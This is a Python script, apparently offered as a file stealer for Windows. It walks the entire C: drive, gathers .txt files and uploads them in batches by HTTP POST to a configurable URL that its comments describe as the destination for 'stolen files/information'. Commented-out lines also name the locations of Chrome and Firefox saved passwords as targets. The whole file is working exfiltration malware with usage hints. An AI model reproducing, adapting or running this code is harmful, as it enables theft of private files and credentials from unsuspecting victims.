import os
import requests
import threading
import mimetypes
from contextlib import ExitStack

URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
USERNAME = os.getlogin()
#GOOGLE_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Local\Google\Chrome\\User Data\Default' # location of Google passwords
#FIREFOX_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found.
# NOTE: Files of interest are already in list so they can be sent right at the start.

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if '.txt' in file: # check file type
                #print(dir + '\\' + file) # for testing
                files_found.append([dir + '\\' + file]) # log the found file's address
            if len(files_found) > 100:
                threading.Thread(target=steal_files()) # run the file stealing mechanism in the background

def steal_files(): # steal files
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    files = {} # progressively add more files to the payload
    with ExitStack() as stack:
        for file in files_found[:count]:
            file = file[0]
            file_name = os.path.basename(file) # get the file name from the path
            f = stack.enter_context(open(file, 'rb')) # open the file in read-only mode binary
            type = mimetypes.guess_type(file) # get the MIME type
            files["files"] = (file_name, f, type) # make the payload for the file containing the file name, the file in binary, and its MIME type and add it to the list of the payload
        r = requests.post(URL, files=files) # POST (send) the file
    if not r.ok:
        pass
    else:
        del files_found[:count]

file_search()